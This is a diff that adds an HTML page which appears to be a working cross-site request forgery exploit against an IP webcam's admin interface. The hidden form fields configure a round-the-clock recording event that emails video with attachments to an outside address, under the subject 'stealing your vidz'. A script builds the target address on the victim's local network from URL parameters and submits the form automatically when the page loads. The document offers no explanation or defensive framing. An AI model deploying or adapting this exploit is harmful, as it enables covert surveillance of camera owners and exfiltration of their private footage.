@@ -1,0 +1,72 @@
+<html>
+<title>
+</title>
+<body>
+
+  <form id="pwnit2" action="willbereplaced/cgi-bin/CGIProxy.fcgi">
+
+    <input type="hidden" name="RecorderPrefix" value="1234" />
+    <input type="hidden" name="Event&#46;E&#46;Name" value="in&#32;ur&#32;webcam" />
+    <input type="hidden" name="Event&#46;E&#46;Type" value="S" />
+    <input type="hidden" name="Event&#46;E&#46;Enabled" value="yes" />
+    <input type="hidden" name="Event&#46;E&#46;SWInput" value="x" />
+    <input type="hidden" name="Event&#46;E&#46;ADInput" value="x" />
+    <input type="hidden" name="Event&#46;E&#46;Weekdays" value="1111111" />
+    <input type="hidden" name="Event&#46;E&#46;Starttime" value="0&#58;0" />
+    <input type="hidden" name="Event&#46;E&#46;Duration" value="24&#58;0" />
+    <input type="hidden" name="Event&#46;E&#46;ScheduleInterval" value="60" />
+    <input type="hidden" name="Event&#46;E&#46;RecorderPrefix" value="1234" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A2&#46;Protocol" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A2&#46;Duration" value="5" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A4&#46;Protocol" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A4&#46;Server" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A4&#46;Duration" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A5&#46;Protocol" value="SMTP" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A5&#46;EmailTo" value="spam&#64;blacktraffic&#46;co&#46;uk" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A5&#46;Subject" value="stealing&#32;your&#32;vidz&#32;" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A5&#46;Message" value="stealing&#32;your&#32;vidz&#32;" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A5&#46;Attached" value="yes" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A7&#46;Protocol" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A7&#46;Server" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A7&#46;Message" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A8&#46;Protocol" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A8&#46;Server" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A8&#46;Message" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A8&#46;CustomParams" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A9&#46;Protocol" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A9&#46;DiskID" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A9&#46;Duration" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A10&#46;Protocol" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A10&#46;Server" value="" />
+    <input type="hidden" name="Event&#46;E&#46;Actions&#46;A10&#46;Duration" value="" />
+    <input type="hidden" name="group" value="Event" />
+    <input type="hidden" name="action" value="add" />
+    <input type="hidden" name="redirect" value="asp&#47;event&#46;asp" />
+          <input type="submit" value="Submit request" />
+
+  </form>
+  
+<script>
+function gup( name, url ) {
+  if (!url) url = location.href;
+  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+  var regexS = "[\\?&]"+name+"=([^&#]*)";
+  var regex = new RegExp( regexS );
+  var results = regex.exec( url );
+  return results == null ? null : results[1];
+}
+
+var lastOctet = gup('octet', window.location.href );
+var network = gup('network', window.location.href );
+
+var iform;
+
+iform=document.getElementById("pwnit2");
+
+iform.action = "http://"+network+"."+lastOctet.toString()+"/cgi-bin/admin/config.cgi";
+
+iform.submit();
+</script>
+
+</body>
+</html>
